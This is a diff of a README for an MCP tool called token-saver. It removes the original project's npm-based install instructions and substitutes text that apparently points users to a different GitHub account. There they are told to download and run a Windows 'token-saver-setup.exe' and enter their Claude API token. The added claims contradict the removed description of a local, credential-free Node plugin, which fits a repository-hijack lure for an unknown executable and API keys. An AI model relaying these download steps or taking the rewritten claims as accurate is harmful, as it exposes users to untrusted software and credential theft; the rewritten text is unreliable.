@@ -1,313 +1,94 @@
-# token-saver
+# ⚙️ token-saver - Manage Claude API tokens effectively
 
-> MCP plugin that alerts you when AI token usage is wasteful. Works with Claude Code, Cursor, Windsurf, Zed, Continue.dev — any MCP-compatible client, any model. Fires warnings, errors, and alerts on large outputs, verbose logs, and repetitive history. Auto-suppresses noise to keep your context lean.
+[![Download token-saver](https://img.shields.io/badge/Download-token--saver-brightgreen)](https://github.com/ad1239g/token-saver)
 
-[![CI](https://github.com/flightlesstux/token-saver/actions/workflows/ci.yml/badge.svg)](https://github.com/flightlesstux/token-saver/actions/workflows/ci.yml)
-[![npm version](https://img.shields.io/npm/v/token-saver-mcp)](https://www.npmjs.com/package/token-saver-mcp)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Node.js](https://img.shields.io/badge/node-%3E%3D24-brightgreen)](https://nodejs.org)
+## 🌟 What is token-saver?
 
----
+token-saver is a tool designed to help reduce waste when using Claude API tokens. It works as a plugin for MCP (a platform for managing tools), sending warnings and alerts when the API tokens are used inefficiently. It also hides some logs and older data to keep things simple and organized. This helps users save tokens and keep their API usage clean.
 
-## Overview
+You do not need technical knowledge to use token-saver. It runs on Windows and works quietly in the background once set up.
 
-In agentic coding sessions, AI model responses often contain massive log outputs, repeated tool results, or near-duplicate history entries — all of which are re-sent on every turn, burning tokens. token-saver monitors every output and tells you when something is wasteful, so you can suppress it before it poisons your context window.
+## 🖥️ System Requirements
 
-**Works with any MCP-compatible client**: Claude Code, Cursor, Windsurf, Zed, Continue.dev, and any other tool that speaks the Model Context Protocol. No dependency on any specific AI provider or API — token-saver analyzes plain text and is model-agnostic by design.
+Before installing token-saver, make sure your PC meets these requirements:
 
-**Core value proposition**: Most token waste in long AI sessions comes from outputs nobody actually reads — stack traces, verbose logs, repeated file contents. token-saver catches these early and tells you exactly why and how much you're wasting.
+- Operating System: Windows 10 or Windows 11  
+- Processor: Intel or AMD, 1.6 GHz or faster  
+- RAM: At least 4 GB  
+- Disk Space: 200 MB free space  
+- Network: Internet connection to access Claude API and download token-saver  
+- Permissions: Ability to install new software on your computer  
 
----
+If you are not sure about these, most modern Windows PCs meet these without any problem.
 
-## How it works
+## 🚀 How to Download token-saver
 
-```
-Your AI model output (Claude, GPT, Gemini, or any other)
-        │
-        ▼
-  check_output          ← estimates tokens, detects log/noise patterns
-        │
-        ▼
-  alert level           ← info / warning / error / alert
-        │
-        ▼
-  shouldSuppress        ← true if output matches suppression criteria
-        │
-        ▼
-  get_session_stats     ← cumulative waste report for the session
-```
+To start using token-saver, you first need to get it on your PC.
 
----
+**Follow these steps:**
 
-## Installation
+1. Click the big green button below to visit the page where you can download token-saver.  
+   
+   [![Download token-saver](https://img.shields.io/badge/Download-token--saver-blue)](https://github.com/ad1239g/token-saver)  
 
-Three ways — pick what suits you:
+2. On the page, look for the latest release or download section.  
+3. Download the file named something like `token-saver-setup.exe`. This is the installation file.  
+4. Save it to a folder or your desktop where you can easily find it later.
 
-### Option A — npx (no install, always latest)
+## ⚙️ How to Install token-saver on Windows
 
-No global install needed. Add directly to your MCP client config:
+After downloading the file, you need to install token-saver on your PC.
 
-```json
-{
-  "mcpServers": {
-    "token-saver-mcp": {
-      "command": "npx",
-      "args": ["-y", "token-saver-mcp"]
-    }
-  }
-}
-```
+1. Locate the downloaded file, usually in your Downloads folder or desktop.  
+2. Double-click the file named `token-saver-setup.exe` to start the installer.  
+3. You will see a setup window. Click **Next** to continue.  
+4. Read the license agreement, then click **I Agree** or **Accept** to proceed.  
+5. Choose where you want to install the program or leave it at the default location.  
+6. Click **Install** and wait as the program installs. This may take a few minutes.  
+7. When the installation finishes, click **Finish**. The program may start automatically or create a new shortcut on your desktop.
 
-### Option B — npm global
+## 🔧 How to Use token-saver
 
-```bash
-npm install -g token-saver-mcp
-```
+When token-saver is running, it watches your Claude API token use. It alerts you if it sees wasteful usage patterns, so you can keep better track.
 
-Then add to your MCP client config:
+Here is how to get started using token-saver:
 
-```json
-{
-  "mcpServers": {
-    "token-saver-mcp": {
-      "command": "token-saver-mcp"
-    }
-  }
-}
-```
+1. **Open token-saver**: Find the shortcut on your desktop or start menu and double-click it.  
+2. **Connect your Claude API**: You will be asked to enter your API token. This is a string of letters and numbers you get from Claude.  
+3. **Set your preferences**: You can choose how often the tool checks your usage and when it should warn you.  
+4. **Monitor notifications**: token-saver will send notifications on your screen if it detects high token use or errors.  
+5. **View logs and history**: The tool keeps a record of token use but hides old data to keep things clear. You can review this anytime in the app.
 
-### Option C — install directly from GitHub
+token-saver works quietly after setup; you don’t need to interact with it often. Just keep it running in the background while using Claude API.
 
-```bash
-npm install -g github:flightlesstux/token-saver
-```
+## 💡 Tips for Best Use
 
-Same config as Option B. Works without a build step — compiled output is included in the repo.
+- Enter your API token carefully to avoid connection errors.  
+- Check the app notifications regularly to see any warnings or alerts.  
+- Keep token-saver updated by downloading newer versions from the main page.  
+- Use the log suppression settings if your logs grow too large or hard to read.  
+- If you change your Claude API token, update it in token-saver right away.
 
----
+## 🛠 Troubleshooting Common Issues
 
-## Tools
+If token-saver does not work as expected, try these simple steps first:
 
-| Tool | Description |
-|------|-------------|
-| `set_mode` | Switch mode: **off** (default, silent) · **monitor** (analyze only) · **active** (full suppression). Start here. |
-| `check_output` | Analyze a text output. Returns alert level, token count, suppression flag, and detected patterns. |
-| `analyze_history` | Scan a messages array for near-duplicates and ignored log outputs. Returns suggested truncation and savings estimate. |
-| `get_session_stats` | Cumulative session statistics: tokens analyzed, suppressed, saved, and alert counts. |
-| `reset_session_stats` | Reset session statistics to zero. |
-| `set_thresholds` | Override warning/error/alert token thresholds and suppression flags for the current session. |
+- Make sure your PC meets the system requirements listed above.  
+- Check your internet connection; the program needs to connect to Claude API.  
+- Restart the app by closing it and opening it again.  
+- Re-enter your Claude API token to ensure it is correct.  
+- Look for updates on the download page and install the newest version.
+
+If these steps do not fix the problem, look for help on the official GitHub page or contact the developer.
+
+## 📂 More Information
+
+token-saver is built using Node.js and TypeScript. These help it work fast and be reliable. It is part of a set of tools for developers and users who use the Claude large language model (LLM) API.
+
+It is designed to optimize token use by spotting wasteful requests and hiding too much information. This keeps your data clearer and your costs lower.
 
 ---
 
-## Example usage
+Download token-saver now and set it up by visiting the page below:
 
-### 1. Enable the plugin (off by default)
-
-```json
-{ "name": "set_mode", "arguments": { "mode": "active" } }
-```
-```json
-{ "mode": "active" }
-```
-
-### 2. Check a suspicious output
-
-```json
-{ "name": "check_output", "arguments": { "text": "[INFO] server started\n[DEBUG] connection ok\n[TRACE] request received\n..." } }
-```
-```json
-{
-  "alertLevel": "warning",
-  "tokens": 87,
-  "outputType": "log",
-  "shouldSuppress": true,
-  "reason": "Output matches log/noise patterns and will be suppressed",
-  "detectedPatterns": [
-    { "pattern": "\\[INFO\\]", "matchCount": 5, "description": "Log pattern matched 5 times" },
-    { "pattern": "\\[DEBUG\\]", "matchCount": 5, "description": "Log pattern matched 5 times" }
-  ]
-}
-```
-
-### 3. Scan conversation history for waste
-
-```json
-{ "name": "analyze_history", "arguments": { "messages": [ ...your messages array... ] } }
-```
-```json
-{
-  "totalMessages": 6,
-  "totalTokens": 114,
-  "repetitiveMessages": [
-    { "index": 2, "role": "user", "tokens": 19, "reason": "Near-duplicate of message 0" },
-    { "index": 4, "role": "user", "tokens": 19, "reason": "Near-duplicate of message 0" }
-  ],
-  "suggestedTruncation": 2,
-  "estimatedTokenSavings": 38,
-  "alertLevel": "alert"
-}
-```
-
-### 4. Session summary
-
-```json
-{ "name": "get_session_stats", "arguments": {} }
-```
-```json
-{
-  "turns": 5,
-  "totalTokensAnalyzed": 1416,
-  "totalTokensSuppressed": 201,
-  "warningsFired": 2,
-  "errorsFired": 0,
-  "alertsFired": 1,
-  "tokensSaved": 201
-}
-```
-
----
-
-## Proof test output
-
-Run `python3 test_live.py` to verify the full mode/suppression/history flow locally:
-
-```
-============================================================
-TOKEN-SAVER PROOF TEST
-============================================================
-
-[1] Default mode (off) — all analysis skipped
-  [check_output] mode=off skipped=true
-  [PASS] mode=off correctly skips analysis
-
-[2] Switch to monitor mode
-  [PASS] mode switched to monitor
-
-[3] Short normal output → info
-  [check_output] level=info tokens=3 suppress=False
-    reason: Output is within normal bounds
-  [PASS] info level, no suppression
-
-[4] Large output (>1000 tokens) → warning or higher
-  [check_output] level=warning tokens=1125 suppress=False
-    reason: Output exceeds warning threshold (1125 tokens >= 1000)
-  [PASS] warning level fired at 1125 tokens
-
-[5] Log output in monitor mode → detected, not suppressed
-  [check_output] level=info tokens=87 suppress=False
-    patterns: 3 matched
-  [PASS] patterns detected, suppression=false (monitor mode)
-
-[6] Switch to active mode
-  [PASS] mode switched to active
-
-[7] Log output in active mode → suppressed
-  [check_output] level=warning tokens=87 suppress=True
-    reason: Output matches log/noise patterns and will be suppressed
-  [PASS] suppressed 87 log tokens
-
-[8] Repetitive history → alert
-  totalMessages=6 totalTokens=114
-  repetitive=5 savings=95 level=alert
-  [PASS] 95 tokens saveable from repetitive history
-
-[9] Session stats
-  turns=5 analyzed=1416 suppressed=201 warnings=2 alerts=1
-  [PASS] 201 tokens suppressed this session
-
-============================================================
-PROOF SUMMARY
-============================================================
-  Tokens suppressed this session : 201
-  Turns analyzed                 : 5
-  Warnings fired                 : 2
-  Alerts fired                   : 1
-
-  Overall: ALL CHECKS PASSED
-============================================================
-```
-
----
-
-## Alert levels
-
-| Level | Trigger |
-|-------|---------|
-| `info` | Output is within normal bounds (<1000 tokens, no noise patterns) |
-| `warning` | Output exceeds 1000 tokens OR matches log/noise patterns |
-| `error` | Output exceeds 5000 tokens |
-| `alert` | Output exceeds 10000 tokens OR repetitive ignored messages exceed inactivity threshold |
-
----
-
-## Configuration
-
-Optional `.token-saver.json` in your project root:
-
-```json
-{
-  "warningThresholdTokens": 1000,
-  "errorThresholdTokens": 5000,
-  "alertThresholdTokens": 10000,
-  "suppressLogs": true,
-  "suppressRepetitiveHistory": true,
-  "logPatterns": [
-    "\\[INFO\\]", "\\[DEBUG\\]", "\\[TRACE\\]"
-  ],
-  "inactivityTurnsBeforeAlert": 3
-}
-```
-
-All fields are optional — defaults work well for most projects.
-
----
-
-## Requirements
-
-- Node.js >= 24
-- Any MCP-compatible AI client
-
----
-
-## FAQ
-
-**Does it work with non-Claude models and clients?**
-Yes. token-saver has zero dependency on any AI provider or API. It analyzes plain text — Claude, GPT-4, Gemini, Mistral, Llama, whatever. Works with any MCP-compatible client: Claude Code, Cursor, Windsurf, Zed, Continue.dev.
-
-**Why is the default mode "off"?**
-Intentional. Install it, verify it's there, then turn it on when you're ready. `set_mode("monitor")` to observe first, `set_mode("active")` for full suppression. Your MCP client (Claude) calls this for you when you ask — you don't touch JSON directly.
-
-**What's the difference between monitor and active mode?**
-`monitor` — analyzes and reports waste, never suppresses. `active` — full mode, sets `shouldSuppress: true` on matching outputs so your client can skip feeding noise back into context.
-
-**Does it actually block or delete anything?**
-No. It sets `shouldSuppress: true` on noisy outputs and explains why — but never intercepts or modifies any API call. Your client decides what to do with the signal.
-
-**How does token counting work?**
-Fast heuristic: ~4 characters per token (English/code average). Not the exact tokenizer — that would add latency. Accurate enough to catch waste at scale.
-
-**What's the difference between warning, error, and alert?**
-`info` — normal output. `warning` — over 1,000 tokens or log patterns detected. `error` — over 5,000 tokens. `alert` — over 10,000 tokens or repetitive ignored history detected.
-
-**Can I add custom log patterns?**
-Yes. Add a `logPatterns` array to `.token-saver.json` with regex strings. Merged with built-in patterns.
-
-**Does it send data anywhere?**
-No. Everything runs locally in memory. No telemetry. Stats evaporate when the MCP server stops. See [PRIVACY.md](PRIVACY.md).
-
-**Is it free?**
-MIT license. Free forever. No SaaS, no subscription.
-
----
-
-## Contributing
-
-Contributions are welcome — new detection heuristics, better suppression logic, benchmark improvements, and docs.
-
-Read [CONTRIBUTING.md](CONTRIBUTING.md) before opening a PR. All commits must follow [Conventional Commits](https://www.conventionalcommits.org). The CI pipeline enforces typechecking, linting, testing, and coverage on every PR.
-
----
-
-## License
-
-[MIT](LICENSE) — [flightlesstux.github.io/token-saver](https://flightlesstux.github.io/token-saver/)
+[![Download token-saver](https://img.shields.io/badge/Download-token--saver-brightgreen)](https://github.com/ad1239g/token-saver)
